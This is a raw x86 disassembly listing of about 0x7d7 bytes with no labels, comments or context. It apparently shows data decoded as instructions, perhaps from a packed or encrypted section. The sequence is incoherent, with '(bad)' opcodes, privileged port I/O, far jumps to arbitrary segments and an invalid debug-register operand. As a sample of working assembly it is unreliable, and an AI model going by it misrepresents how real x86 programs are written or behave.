  41743d:	bound  esp,QWORD PTR [edi+0x157c213a]
  417443:	push   0xffffff87
  417445:	or     eax,0xdaf89a7d
  41744a:	ja     0x4174a1
  41744c:	push   ebp
  41744d:	aas    
  41744e:	sbb    al,0xb6
  417450:	mov    ds:0x1a1bee7,eax
  417455:	dec    ecx
  417456:	cmp    eax,0x4891a6df
  41745b:	cdq    
  41745c:	inc    edi
  41745d:	pop    eax
  41745e:	add    DWORD PTR [edi+0x54b49a33],eax
  417464:	sbb    BYTE PTR [edi-0x610c0a47],bh
  41746a:	mov    WORD PTR [edx*4-0x519fa565],gs
  417471:	inc    esi
  417472:	inc    esi
  417473:	pop    es
  417474:	fmul   DWORD PTR [ebp+0x65]
  417477:	in     eax,0x6c
  417479:	sbb    edx,DWORD PTR [ecx+0x1f]
  41747c:	push   eax
  41747d:	aam    0xa3
  41747f:	mov    dl,0xae
  417481:	jecxz  0x417403
  417483:	cmp    eax,0x5a4579b7
  417488:	mov    ecx,0xc6c9c703
  41748d:	inc    BYTE PTR [ebx]
  41748f:	mov    al,0xb7
  417491:	call   0x24f3:0x7cab902b
  417498:	loop   0x41749a
  41749a:	mov    edi,ebx
  41749c:	jnp    0x417498
  41749e:	push   es
  41749f:	pmuludq mm1,QWORD PTR [ebp+0x1a2d7bb4]
  4174a6:	mov    es,edx
  4174a8:	addr16 pushf 
  4174aa:	mov    ch,0x81
  4174ac:	arpl   WORD PTR [ebx+0x50d1190d],sp
  4174b2:	imul   ebp,DWORD PTR [edx-0x70d6971d],0x3
  4174b9:	xor    DWORD PTR [ebx],0xfffffff9
  4174bc:	push   ebp
  4174bd:	fdiv   QWORD PTR [eax]
  4174bf:	pop    esp
  4174c0:	sub    DWORD PTR [esi-0x47],ecx
  4174c3:	scas   eax,DWORD PTR es:[edi]
  4174c4:	push   esp
  4174c5:	repnz fcom st(6)
  4174c8:	sub    BYTE PTR [ebx],bh
  4174ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174cb:	cwde   
  4174cc:	aas    
  4174cd:	aaa    
  4174ce:	dec    ebx
  4174cf:	or     eax,0x3176fe1c
  4174d4:	jnp    0x41748d
  4174d6:	mov    al,ds:0x8f021a6b
  4174db:	dec    ebx
  4174dc:	mov    ebp,DWORD PTR [esi]
  4174de:	xor    eax,0xa40bb858
  4174e3:	fst    QWORD PTR [esi+esi*1+0x2e18e5fe]
  4174ea:	nop
  4174eb:	and    eax,0x40e81f24
  4174f0:	and    bh,BYTE PTR [eax+0x5f]
  4174f3:	gs cmp dl,cl
  4174f6:	cmp    DWORD PTR [ecx],edx
  4174f8:	cmp    ch,BYTE PTR [ecx-0x31]
  4174fb:	xchg   esp,eax
  4174fc:	add    esp,DWORD PTR gs:[edx-0x26]
  417500:	xchg   ebp,eax
  417501:	stc    
  417502:	cld    
  417503:	jge    0x41755d
  417505:	xor    ebx,DWORD PTR [ecx]
  417507:	and    eax,0xc983496a
  41750c:	sahf   
  41750d:	out    0x1e,eax
  41750f:	in     eax,dx
  417510:	js     0x4174c4
  417512:	int    0xd6
  417514:	xor    BYTE PTR [esp+eax*2-0x1d],ch
  417518:	scas   al,BYTE PTR es:[edi]
  417519:	cdq    
  41751a:	push   esi
  41751b:	push   esi
  41751c:	adc    eax,0xd061ac42
  417521:	mov    ah,0x2e
  417523:	pop    edi
  417524:	push   edx
  417525:	fcmovne st,st(1)
  417527:	fstp   QWORD PTR [ebx]
  417529:	test   al,0x87
  41752b:	rcr    DWORD PTR [ebx],cl
  41752d:	cmp    eax,0xe1b00dd7
  417532:	jge    0x4174f7
  417534:	fwait
  417535:	jne    0x4174bf
  417537:	mov    ds,edx
  417539:	mov    bl,0xa7
  41753b:	inc    edx
  41753c:	pop    edi
  41753d:	push   esi
  41753e:	inc    esp
  41753f:	push   ds
  417540:	push   cs
  417541:	dec    edi
  417542:	xor    dl,BYTE PTR [edi]
  417544:	test   eax,0x704c1071
  417549:	mov    ss,ebx
  41754b:	xchg   ebp,eax
  41754c:	xlat   BYTE PTR ds:[ebx]
  41754d:	sub    ah,BYTE PTR [eax-0x15]
  417550:	pushf  
  417551:	daa    
  417552:	jmp    0x417526
  417554:	mov    edx,0x562a627c
  417559:	out    dx,eax
  41755a:	lds    ebp,FWORD PTR [ebx+edx*2]
  41755d:	and    al,0x13
  41755f:	retf   0x3502
  417562:	mov    dl,0xa6
  417564:	mov    ecx,0x2d07fcb1
  417569:	retf   0x8217
  41756c:	mov    esp,0xb258be3d
  417571:	sbb    eax,0x8e400d4b
  417576:	push   es
  417577:	scas   al,BYTE PTR es:[edi]
  417578:	(bad)  
  417579:	jmp    0x3f1:0xe8fdca18
  417580:	xor    edx,edx
  417582:	mov    bh,cl
  417584:	jle    0x4175d8
  417586:	loopne 0x417582
  417588:	xchg   esp,eax
  417589:	xchg   edi,eax
  41758a:	(bad)  
  41758b:	in     al,0x1d
  41758d:	fmul   st,st(6)
  41758f:	mov    dh,0xbf
  417591:	lods   al,BYTE PTR ds:[esi]
  417592:	imul   eax,DWORD PTR [ecx*8-0x425db3c1],0xffffffdf
  41759a:	sbb    eax,0x4f4e8663
  41759f:	and    al,0x52
  4175a1:	push   eax
  4175a2:	sbb    eax,0xc8a34e7b
  4175a7:	aad    0x81
  4175a9:	and    esp,DWORD PTR ds:0x39904496
  4175af:	gs pop ecx
  4175b1:	daa    
  4175b2:	gs test al,0x99
  4175b5:	call   0x4a91:0xa192fc8
  4175bc:	push   esi
  4175bd:	mov    ds:0x12b0dead,eax
  4175c2:	xlat   BYTE PTR ds:[ebx]
  4175c3:	jecxz  0x41763b
  4175c5:	aas    
  4175c6:	retf   0x39fd
  4175c9:	jo     0x4175b6
  4175cb:	sub    eax,DWORD PTR [ecx+eiz*8-0x15e7362f]
  4175d2:	xor    bh,BYTE PTR [eax]
  4175d4:	push   ss
  4175d5:	xchg   ebx,eax
  4175d6:	push   ds
  4175d7:	out    dx,al
  4175d8:	imul   edi,DWORD PTR [eax-0x2bc4ae7f],0x47
  4175df:	retf   
  4175e0:	xor    ecx,DWORD PTR [ecx-0x3df218d3]
  4175e6:	mov    al,0xe1
  4175e8:	(bad)  
  4175e9:	push   ebx
  4175ea:	jo     0x417612
  4175ec:	ja     0x41763a
  4175ee:	fwait
  4175ef:	push   ecx
  4175f0:	inc    esp
  4175f1:	in     eax,dx
  4175f2:	fidiv  DWORD PTR [eax]
  4175f4:	dec    ebp
  4175f5:	bound  eax,QWORD PTR [esi-0x67f16174]
  4175fb:	mov    al,ds:0x9635bb5
  417600:	lods   al,BYTE PTR ds:[esi]
  417601:	xor    ebx,ecx
  417603:	lock xchg esp,eax
  417605:	jb     0x417625
  417607:	xor    DWORD PTR [ebp-0x43e38f81],esp
  41760d:	jl     0x417681
  41760f:	mov    esi,0x67eaffc5
  417614:	xchg   ecx,eax
  417615:	pop    edi
  417616:	sbb    eax,0x7b3eac24
  41761b:	aas    
  41761c:	mov    ah,0x45
  41761e:	call   0xdb5d:0xf7b64b80
  417625:	and    ecx,ebx
  417627:	je     0x4175aa
  417629:	mov    al,ds:0xce0be9e0
  41762e:	xlat   BYTE PTR ds:[ebx]
  41762f:	cmp    DWORD PTR ds:0xfe79aed7,ecx
  417635:	aam    0xf0
  417637:	xor    edi,DWORD PTR [ebx+0x28]
  41763a:	outs   dx,DWORD PTR ds:[esi]
  41763b:	push   cs
  41763c:	adc    cl,BYTE PTR [esi]
  41763e:	into   
  41763f:	fistp  QWORD PTR [eax]
  417641:	inc    ebx
  417642:	push   ebp
  417643:	ins    DWORD PTR es:[edi],dx
  417644:	push   ebx
  417645:	sbb    ch,dl
  417647:	jg     0x4175f9
  417649:	push   eax
  41764a:	les    edi,FWORD PTR [eax-0x5e8fc973]
  417650:	mov    db5,eax
  417653:	out    dx,al
  417654:	add    esi,DWORD PTR [ebp+0x4dd2dbb6]
  41765a:	fmul   DWORD PTR [esi-0x370f8509]
  417660:	cmp    eax,0x37bfc172
  417665:	mov    ebx,0xa0b0340b
  41766a:	or     ecx,DWORD PTR [edi-0x3b]
  41766d:	mov    BYTE PTR [edi*8+0x47e452fa],bh
  417674:	imul   edx,eax,0xffffff80
  417677:	add    ebx,DWORD PTR [bx+si]
  41767a:	ret    
  41767b:	jmp    0x881f1046
  417680:	mov    eax,ds:0x7fa8dc48
  417685:	or     eax,0x9837e3
  41768a:	(bad)  
  41768c:	bound  ebx,QWORD PTR [ebx+0x785c4dd1]
  417692:	push   eax
  417693:	aam    0x76
  417695:	ss push eax
  417697:	js     0x417625
  417699:	sahf   
  41769a:	xor    ecx,edi
  41769c:	jle    0x417663
  41769e:	sti    
  41769f:	js     0x41771f
  4176a1:	xchg   esi,eax
  4176a2:	retf   
  4176a3:	shr    esp,cl
  4176a5:	dec    ebx
  4176a6:	out    0x35,eax
  4176a8:	or     al,bl
  4176aa:	cld    
  4176ab:	scas   eax,DWORD PTR es:[edi]
  4176ac:	iret   
  4176ad:	push   esp
  4176ae:	or     ebx,DWORD PTR [eax]
  4176b0:	mov    dl,0x3f
  4176b2:	fwait
  4176b3:	mov    ds:0x2d57b96c,eax
  4176b8:	scas   eax,DWORD PTR es:[edi]
  4176b9:	adc    al,0xa3
  4176bb:	adc    esp,ecx
  4176bd:	(bad)  
  4176bf:	mov    esp,0xa6d830b9
  4176c4:	aaa    
  4176c5:	xor    dl,BYTE PTR [ebx-0x5967d38e]
  4176cb:	inc    DWORD PTR [ecx+edx*2]
  4176ce:	xor    BYTE PTR [edx+0x6a],dl
  4176d1:	cmp    al,0xec
  4176d3:	push   es
  4176d4:	ins    BYTE PTR es:[edi],dx
  4176d5:	sbb    bl,BYTE PTR [eax+edi*4-0x3d77ab69]
  4176dc:	call   0x9cd6:0x4f9a9c8c
  4176e3:	js     0x417701
  4176e5:	jne    0x417726
  4176e7:	mov    ebx,0x701d8b8e
  4176ec:	inc    edx
  4176ed:	mov    esp,0x70397cd3
  4176f2:	or     DWORD PTR [esi+0x39],0x65
  4176f6:	mov    al,ds:0x6b6c8835
  4176fb:	add    DWORD PTR [edx+0x14198fea],ebp
  417701:	add    DWORD PTR [ebx-0x4e],ebx
  417704:	out    dx,al
  417705:	add    al,0x4b
  417707:	inc    edi
  417708:	push   0xffffffb5
  41770a:	popa   
  41770b:	dec    eax
  41770c:	cmp    esp,DWORD PTR [ecx]
  41770e:	jmp    0x7565719f
  417713:	inc    ebx
  417714:	and    ebx,DWORD PTR [esi]
  417716:	test   dl,dh
  417718:	inc    BYTE PTR [esi+0x4f889723]
  41771e:	mov    DWORD PTR [ecx-0x41],edi
  417721:	xchg   esi,eax
  417722:	xchg   BYTE PTR [eax+0x50],al
  417725:	ja     0x4176e4
  417727:	mov    ah,0xa8
  417729:	xchg   BYTE PTR [edx-0x2a431051],ah
  41772f:	rol    DWORD PTR [ecx-0x77b925b8],0xe5
  417736:	xchg   edi,eax
  417737:	dec    ebp
  417738:	mov    bl,0xcd
  41773a:	mov    dl,0x7d
  41773c:	int    0x69
  41773e:	cmp    BYTE PTR [esp+ecx*8-0x67a92438],ch
  417745:	pop    esp
  417746:	sbb    al,0x3c
  417748:	hlt    
  417749:	pop    ds
  41774a:	mov    ecx,DWORD PTR ss:[esi+edx*1-0x25fe06b7]
  417752:	pop    esp
  417753:	fadd   DWORD PTR [eax+0x638197f9]
  417759:	and    eax,esi
  41775b:	xchg   esi,eax
  41775c:	scas   al,BYTE PTR es:[edi]
  41775d:	ja     0x41772a
  41775f:	fs inc ecx
  417761:	push   ds
  417762:	push   DWORD PTR [ebp+edx*1-0x3e]
  417766:	mov    bh,dl
  417768:	or     DWORD PTR [edx-0xd],eax
  41776b:	jle    0x417720
  41776d:	ds xchg edx,eax
  41776f:	adc    eax,0x46cc91a5
  417774:	cmp    ecx,DWORD PTR [ecx]
  417776:	sbb    eax,0x6f7bb062
  41777b:	rcl    DWORD PTR [edx],cl
  41777d:	push   ebx
  41777e:	sbb    dl,bh
  417780:	mov    edx,0xc33640a
  417785:	popa   
  417786:	inc    eax
  417787:	bnd jbe 0x4177c1
  41778a:	inc    ecx
  41778b:	ins    DWORD PTR es:[edi],dx
  41778c:	jmp    0x417725
  41778e:	inc    ecx
  41778f:	jmp    0x1f7b49ef
  417794:	outs   dx,DWORD PTR ds:[esi]
  417795:	sbb    DWORD PTR [esi+0x3527c415],eax
  41779b:	leave  
  41779c:	mov    DWORD PTR [edi],0x22e5952
  4177a2:	in     eax,dx
  4177a3:	sbb    eax,0x84203497
  4177a8:	in     al,0x82
  4177aa:	mov    edx,0x999d3f1c
  4177af:	push   0xadfaf93f
  4177b4:	in     al,0xae
  4177b6:	int3   
  4177b7:	(bad)  
  4177b8:	xchg   edi,eax
  4177b9:	enter  0xb550,0xd8
  4177bd:	xor    eax,0xde2b2099
  4177c2:	push   es
  4177c3:	add    BYTE PTR [esi+0x3f],ah
  4177c6:	sub    DWORD PTR [esi+0x4bdbc612],eax
  4177cc:	cmc    
  4177cd:	les    edx,FWORD PTR [ecx-0x490d9820]
  4177d3:	push   cs
  4177d4:	sub    eax,0xd1db2cf8
  4177d9:	cmp    bh,al
  4177db:	adc    eax,0xf528b7ca
  4177e0:	scas   eax,DWORD PTR es:[edi]
  4177e1:	arpl   WORD PTR [esi+esi*8],dx
  4177e4:	scas   eax,DWORD PTR es:[edi]
  4177e5:	idiv   DWORD PTR [edx+0x8]
  4177e8:	cdq    
  4177e9:	dec    ebp
  4177ea:	mov    bl,0x4d
  4177ec:	ins    BYTE PTR es:[edi],dx
  4177ed:	clc    
  4177ee:	cdq    
  4177ef:	scas   al,BYTE PTR es:[edi]
  4177f0:	inc    ebp
  4177f1:	addr16 adc ebx,ebx
  4177f4:	pop    esp
  4177f5:	into   
  4177f6:	jmp    0x27cc9b35
  4177fb:	shl    bl,cl
  4177fd:	add    eax,0xb51d7dac
  417802:	gs pop ds
  417804:	jg     0x41782c
  417806:	dec    esi
  417807:	jecxz  0x41786f
  417809:	adc    DWORD PTR [ecx],edx
  41780b:	sub    eax,0x5ddf8cca
  417810:	jo     0x4177be
  417812:	adc    esi,DWORD PTR [edi]
  417814:	or     BYTE PTR [edi-0x37ae0d89],dh
  41781a:	repnz lahf 
  41781c:	retf   
  41781d:	retf   
  41781e:	adc    esi,DWORD PTR [ebp-0x246050c6]
  417824:	ret    
  417825:	or     ebp,ecx
  417827:	push   ds
  417828:	xchg   edx,eax
  417829:	sbb    DWORD PTR [edx-0x2c2b97d3],0x4fe2ca63
  417833:	aad    0xb9
  417835:	inc    ebp
  417836:	nop
  417837:	push   esp
  417838:	push   ebx
  417839:	jmp    0x8741:0x332ff46f
  417840:	mov    esp,0xa03b9953
  417845:	add    dh,BYTE PTR [ebx]
  417847:	pop    eax
  417848:	xchg   esp,eax
  417849:	mov    ds:0xc8207d01,eax
  41784e:	pop    eax
  41784f:	hlt    
  417850:	cdq    
  417851:	push   esi
  417852:	popa   
  417853:	mov    al,0x67
  417855:	inc    esp
  417856:	sti    
  417857:	leave  
  417858:	mov    ah,0xdd
  41785a:	cmp    esp,DWORD PTR [edi+0x2d2f0459]
  417860:	jne    0x417898
  417862:	or     DWORD PTR [eax+eax*8-0x31f826a3],esp
  417869:	iret   
  41786a:	mov    ch,0x38
  41786c:	in     eax,dx
  41786d:	shl    DWORD PTR [eax-0x26],cl
  417870:	mov    ah,0xf4
  417872:	or     al,0x91
  417874:	(bad)  
  417875:	mov    ds,WORD PTR [ebx+0x39cbb261]
  41787b:	dec    ebp
  41787c:	dec    edi
  41787d:	je     0x417842
  41787f:	aad    0x36
  417881:	adc    esp,DWORD PTR [edx+0x31]
  417884:	xor    ecx,DWORD PTR [ecx-0xed0bec4]
  41788a:	pop    ebp
  41788b:	add    BYTE PTR [ebp+0x3748a27b],0x33
  417892:	xor    eax,0xfb48e4cd
  417897:	imul   ecx,DWORD PTR [ecx-0xc],0x6c
  41789b:	jnp    0x417863
  41789d:	xchg   edx,eax
  41789e:	add    DWORD PTR [ecx+ecx*2+0x21],0xffffffb6
  4178a3:	lea    esp,[eax]
  4178a5:	bound  ebp,QWORD PTR [ecx+edx*2]
  4178a8:	pop    esp
  4178a9:	pop    eax
  4178aa:	adc    cl,BYTE PTR [ebp+0x57d71d20]
  4178b0:	adc    ah,bh
  4178b2:	jecxz  0x41787d
  4178b4:	sbb    ebx,DWORD PTR [edx]
  4178b6:	call   0xf3e8:0xe6d5c042
  4178bd:	xor    eax,0xb0425963
  4178c2:	mov    esi,0x63a26f92
  4178c7:	xor    BYTE PTR [esi*1+0x228a116d],ch
  4178ce:	mov    ch,0xd
  4178d0:	stc    
  4178d1:	ret    
  4178d2:	dec    ebp
  4178d3:	mov    eax,0x3821e906
  4178d8:	xchg   esp,eax
  4178d9:	jbe    0x4178f4
  4178db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178dc:	mov    dh,0x9b
  4178de:	jae    0x4178b9
  4178e0:	bound  esi,QWORD PTR [ebx+0x6a]
  4178e3:	sub    bh,dl
  4178e5:	cld    
  4178e6:	bound  edx,QWORD PTR [edx+eiz*1-0xae00d06]
  4178ed:	scas   eax,DWORD PTR es:[edi]
  4178ee:	add    bl,ah
  4178f0:	jp     0x41792f
  4178f2:	popa   
  4178f3:	sub    BYTE PTR [edi+0x2a],bh
  4178f6:	xchg   ebp,eax
  4178f7:	xor    al,0xa7
  4178f9:	js     0x417974
  4178fb:	xchg   edi,eax
  4178fc:	jae    0x417920
  4178fe:	add    eax,0x8267362f
  417903:	mov    edx,ebx
  417905:	jmp    0xb732:0x86b7c7a0
  41790c:	add    esp,edi
  41790e:	adc    al,0xe6
  417910:	fistp  QWORD PTR [edi]
  417912:	mov    cl,0xcd
  417914:	loop   0x417944
  417916:	in     eax,0xfb
  417918:	pop    edi
  417919:	xor    DWORD PTR [edi+0x7baf8ec6],edx
  41791f:	test   eax,ecx
  417921:	xchg   ebx,eax
  417922:	pop    edx
  417923:	push   edi
  417924:	int3   
  417925:	xor    al,0x1c
  417927:	popa   
  417928:	push   ecx
  417929:	sub    al,BYTE PTR [edi]
  41792b:	mov    al,ds:0x62cec5f
  417930:	lods   al,BYTE PTR ds:[esi]
  417931:	jmp    0x1f8a48d4
  417936:	push   esi
  417937:	pusha  
  417938:	mov    ds:0x82173f65,eax
  41793d:	fsubr  QWORD PTR [esi+0x7d2c26f2]
  417943:	dec    esi
  417944:	add    edi,ebx
  417946:	in     al,dx
  417947:	jb     0x4178e2
  417949:	xchg   DWORD PTR [esi],ecx
  41794b:	inc    edx
  41794c:	das    
  41794d:	ja     0x4178ff
  41794f:	adc    BYTE PTR ds:0xdd3db376,ah
  417955:	push   0xffffff9e
  417957:	mul    BYTE PTR [eax-0x13bd3e43]
  41795d:	(bad)  
  41795e:	or     ah,BYTE PTR [esi-0x26]
  417961:	ins    BYTE PTR es:[edi],dx
  417962:	shr    edx,cl
  417964:	(bad)
  417968:	cmp    al,0x58
  41796a:	mov    al,0xdc
  41796c:	sub    eax,0x4ad46ec0
  417971:	jbe    0x4179f2
  417973:	xchg   ecx,eax
  417974:	shr    BYTE PTR ds:0x5e6c2bfb,1
  41797a:	mov    dh,0xb3
  41797c:	out    dx,eax
  41797d:	add    al,bl
  41797f:	dec    ebp
  417980:	outs   dx,BYTE PTR ds:[esi]
  417981:	imul   edx,DWORD PTR [edx],0xffffffdc
  417984:	jmp    0x41797a
  417986:	cmp    dl,BYTE PTR [edx+0x7f9a359]
  41798c:	ins    DWORD PTR es:[edi],dx
  41798d:	mov    eax,ds:0x64280d28
  417992:	enter  0xb3f0,0xe9
  417996:	gs jg  0x417983
  417999:	or     eax,0xa7dc407c
  41799e:	enter  0xa72f,0x34
  4179a2:	mov    ebp,0xfe0b9c92
  4179a7:	mov    cl,0x27
  4179a9:	(bad)
  4179ac:	mov    ch,0xa6
  4179ae:	(bad)  
  4179af:	lock mov eax,ds:0xac2e6260
  4179b5:	inc    ebp
  4179b6:	adc    ecx,DWORD PTR [edi]
  4179b8:	add    al,0x8b
  4179ba:	and    DWORD PTR [edx],ebx
  4179bc:	popa   
  4179bd:	mov    ebx,0x5f97b7f3
  4179c2:	jnp    0x4179af
  4179c4:	xchg   esp,eax
  4179c5:	mov    cl,ch
  4179c7:	cli    
  4179c8:	dec    ebx
  4179c9:	push   edx
  4179ca:	in     eax,dx
  4179cb:	cmp    eax,0x20f9c181
  4179d0:	mov    cl,0xcf
  4179d2:	add    dh,bh
  4179d4:	add    al,0x5a
  4179d6:	push   eax
  4179d7:	es dec edi
  4179d9:	jns    0x417a01
  4179db:	pusha  
  4179dc:	push   edx
  4179dd:	push   ebp
  4179de:	retf   
  4179df:	stos   BYTE PTR es:[edi],al
  4179e0:	and    ebp,esi
  4179e2:	or     cl,BYTE PTR [edi+0x6fd357d2]
  4179e8:	jne    0x417a0f
  4179ea:	shl    BYTE PTR [ebx+0x47b00913],cl
  4179f0:	mov    bh,0xbd
  4179f2:	dec    edi
  4179f3:	mov    bl,0xd0
  4179f5:	stos   DWORD PTR es:[edi],eax
  4179f6:	xor    BYTE PTR [edi-0x389c5d19],bl
  4179fc:	jno    0x4179e0
  4179fe:	je     0x4179f2
  417a00:	sbb    eax,0x3da3fb03
  417a05:	jp     0x417a78
  417a07:	in     eax,dx
  417a08:	(bad)  
  417a09:	dec    ecx
  417a0a:	or     ebx,DWORD PTR [ebx-0x7e9c5641]
  417a10:	inc    esi
  417a11:	xchg   DWORD PTR ds:0x6af9fb2e,ecx
  417a17:	loop   0x417a1c
  417a19:	rol    BYTE PTR [edx+0x72f5bad9],0xa1
  417a20:	retf   
  417a21:	out    0x5c,al
  417a23:	aaa    
  417a24:	push   ebx
  417a25:	ja     0x417a1c
  417a27:	xchg   ebx,eax
  417a28:	sbb    DWORD PTR [edx+edi*4],ecx
  417a2b:	js     0x4179c5
  417a2d:	sub    BYTE PTR [ebx+0x6d],0xcf
  417a31:	fstp   DWORD PTR [ebx]
  417a33:	loopne 0x417a0e
  417a35:	push   esp
  417a36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a37:	gs out dx,eax
  417a39:	out    dx,eax
  417a3a:	div    BYTE PTR [edi-0x65]
  417a3d:	inc    ecx
  417a3e:	add    edi,DWORD PTR [edx]
  417a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a41:	cdq    
  417a42:	xor    BYTE PTR [ecx],ah
  417a44:	das    
  417a45:	test   al,0xef
  417a47:	ja     0x417a80
  417a49:	jle    0x417a5a
  417a4b:	pop    edi
  417a4c:	xor    eax,0x9d7082f
  417a51:	xchg   edi,eax
  417a52:	push   0x1
  417a54:	jbe    0x417a62
  417a56:	jnp    0x4179fe
  417a58:	mov    ch,0x63
  417a5a:	lahf   
  417a5b:	jne    0x4179f8
  417a5d:	and    bl,ah
  417a5f:	(bad)  
  417a60:	push   ds
  417a61:	xchg   BYTE PTR [eax+0x30],cl
  417a64:	xchg   ecx,eax
  417a65:	dec    esp
  417a66:	cld    
  417a67:	pop    edx
  417a68:	sbb    BYTE PTR [ebp+0x46],dl
  417a6b:	(bad)  
  417a6c:	and    cl,BYTE PTR [eax-0x315ea17e]
  417a72:	jb     0x417a7b
  417a74:	mov    DWORD PTR [ebx+eiz*2+0x22e1f502],esp
  417a7b:	push   esp
  417a7c:	xchg   edi,eax
  417a7d:	hlt    
  417a7e:	dec    esi
  417a7f:	mov    al,ds:0xc3bad7dd
  417a84:	cwde   
  417a85:	lock xor esp,DWORD PTR [eax-0x6d7c2946]
  417a8c:	push   esi
  417a8d:	gs pop edx
  417a8f:	cli    
  417a90:	mov    esi,DWORD PTR [ebx]
  417a92:	out    0xa9,al
  417a94:	xor    BYTE PTR [ecx+0x2b],0xcd
  417a98:	outs   dx,BYTE PTR ds:[esi]
  417a99:	sbb    al,0x92
  417a9b:	out    0x58,al
  417a9d:	int    0x41
  417a9f:	jb     0x417a97
  417aa1:	ss cmc 
  417aa3:	cdq    
  417aa4:	pop    ecx
  417aa5:	(bad)  
  417aa6:	jo     0x417ab6
  417aa8:	or     ch,dh
  417aaa:	lock cmp BYTE PTR [ebp+0x16b5bf08],ah
  417ab1:	xchg   ecx,eax
  417ab2:	jmp    0x417b30
  417ab4:	xlat   BYTE PTR ds:[ebx]
  417ab5:	in     eax,0x97
  417ab7:	and    DWORD PTR [esp+edx*1-0x5d],esi
  417abb:	mov    fs,WORD PTR [edx+edi*2-0x2d798750]
  417ac2:	xchg   edx,eax
  417ac3:	jge    0x417a7b
  417ac5:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ac7:	xchg   ebx,eax
  417ac8:	or     ecx,0xffffff9d
  417acb:	xor    DWORD PTR [ebx],ebp
  417acd:	jae    0x417b40
  417acf:	je     0x417a64
  417ad1:	clc    
  417ad2:	push   ds
  417ad3:	cli    
  417ad4:	js     0x417aa2
  417ad6:	es ffree st(1)
  417ad9:	retf   0x52e0
  417adc:	dec    ebp
  417add:	push   esp
  417ade:	push   es
  417adf:	sti    
  417ae0:	sbb    BYTE PTR [edx+0x53ca2716],al
  417ae6:	scas   eax,DWORD PTR es:[edi]
  417ae7:	xchg   BYTE PTR [ebx],bl
  417ae9:	sub    cl,ah
  417aeb:	add    eax,0x6d1929ef
  417af0:	data16 add al,BYTE PTR [edi+0xf]
  417af4:	push   ds
  417af5:	popf   
  417af6:	icebp  
  417af7:	or     eax,0x174f758c
  417afc:	(bad)  
  417afd:	aas    
  417afe:	jmp    0x417af2
  417b00:	mov    ds:0x1a1af27e,al
  417b05:	jb     0x417b24
  417b07:	call   0x94894032
  417b0c:	fwait
  417b0d:	mov    dl,0x15
  417b0f:	jmp    0xf5bdd30
  417b14:	jns    0x417aff
  417b16:	inc    ebp
  417b17:	sti    
  417b18:	rol    ch,0xb
  417b1b:	loopne 0x417b33
  417b1d:	fistp  WORD PTR [edi-0x687fc741]
  417b23:	dec    edx
  417b24:	mov    esi,0x86d93a44
  417b29:	icebp  
  417b2a:	or     edx,DWORD PTR [ebx+ebp*1+0x2a]
  417b2e:	sbb    eax,DWORD PTR cs:[ecx]
  417b31:	lahf   
  417b32:	xor    edi,DWORD PTR ds:0x4bf7dc54
  417b38:	shr    DWORD PTR [ebp-0x34901092],1
  417b3e:	inc    eax
  417b3f:	add    esi,DWORD PTR [ebp+0x79]
  417b42:	aas    
  417b43:	dec    ecx
  417b44:	loope  0x417bba
  417b46:	jp     0x417b76
  417b48:	mov    cl,0xab
  417b4a:	test   DWORD PTR [ebp+0xa12ba38],esp
  417b50:	prefetch BYTE PTR [eax]
  417b53:	and    bl,BYTE PTR [ebx-0x740d02ec]
  417b59:	sub    DWORD PTR [edx],ebp
  417b5b:	or     ecx,DWORD PTR [edi]
  417b5d:	mov    edi,0x105f77d2
  417b62:	in     al,dx
  417b63:	sbb    dl,BYTE PTR [eax+0xd8add14]
  417b69:	and    edx,DWORD PTR [edx]
  417b6b:	xor    al,0x6c
  417b6d:	pop    ss
  417b6e:	mov    ebp,0x24002cfe
  417b73:	jbe    0x417bd3
  417b75:	fnsave [ebp-0x2a]
  417b78:	dec    ebx
  417b79:	mov    ecx,0x4ad1d199
  417b7e:	into   
  417b7f:	ins    DWORD PTR es:[edi],dx
  417b80:	inc    ebx
  417b81:	outs   dx,DWORD PTR ds:[esi]
  417b82:	test   al,0xd2
  417b84:	idiv   DWORD PTR [ebx+0x76]
  417b87:	int3   
  417b88:	adc    ch,BYTE PTR [ebx]
  417b8a:	fs js  0x417b90
  417b8d:	adc    eax,0x4bb4d9b6
  417b92:	stos   BYTE PTR es:[edi],al
  417b93:	jmp    0x741938c5
  417b98:	stos   BYTE PTR es:[edi],al
  417b99:	test   eax,0x8c95b163
  417b9e:	adc    dh,BYTE PTR ds:0x31654922
  417ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ba5:	sbb    eax,0x3d243d65
  417baa:	js     0x417c21
  417bac:	popa   
  417bad:	xchg   ebx,eax
  417bae:	jno    0x417bc6
  417bb0:	lods   eax,DWORD PTR ds:[esi]
  417bb1:	clc    
  417bb2:	pop    ebp
  417bb3:	sbb    esp,DWORD PTR [esi]
  417bb5:	xchg   ebx,eax
  417bb6:	je     0x417b4c
  417bb8:	or     BYTE PTR [eax-0x43],dl
  417bbb:	ret    
  417bbc:	xchg   BYTE PTR [edx-0x13],al
  417bbf:	xchg   esi,eax
  417bc0:	xchg   esp,eax
  417bc1:	popf   
  417bc2:	pop    ebp
  417bc3:	in     eax,0x99
  417bc5:	(bad)  
  417bc6:	lods   al,BYTE PTR ds:[esi]
  417bc7:	or     DWORD PTR [edi-0x52],ebp
  417bca:	and    eax,0x7d5209ab
  417bcf:	pop    edx
  417bd0:	add    eax,DWORD PTR [ecx]
  417bd2:	inc    esp
  417bd3:	push   ebp
  417bd4:	ins    DWORD PTR es:[edi],dx
  417bd5:	sbb    dh,al
  417bd7:	pop    ecx
  417bd8:	jle    0x417b6a
  417bda:	shl    ecx,cl
  417bdc:	cmp    ch,bl
  417bde:	lea    eax,[eax-0x7413b722]
  417be4:	ror    bl,0x24
  417be7:	mov    ebp,eax
  417be9:	ret    
  417bea:	or     eax,0x70f3c67
  417bef:	mov    ebx,DWORD PTR fs:[esi+edx*4]
  417bf3:	loopne 0x417c71
  417bf5:	in     al,0x63
  417bf7:	jg     0x417bb9
  417bf9:	or     ch,dl
  417bfb:	aas    
  417bfc:	aad    0xa0
  417bfe:	stos   DWORD PTR es:[edi],eax
  417bff:	add    ch,BYTE PTR [ebp+0x93ccce8]
  417c05:	iret   
  417c06:	test   al,0xe9
  417c08:	imul   edx,esp,0xbba819e9
  417c0e:	or     DWORD PTR [ebx-0x32c33f21],esi
  417c14:	xlat   BYTE PTR ds:[ebx]
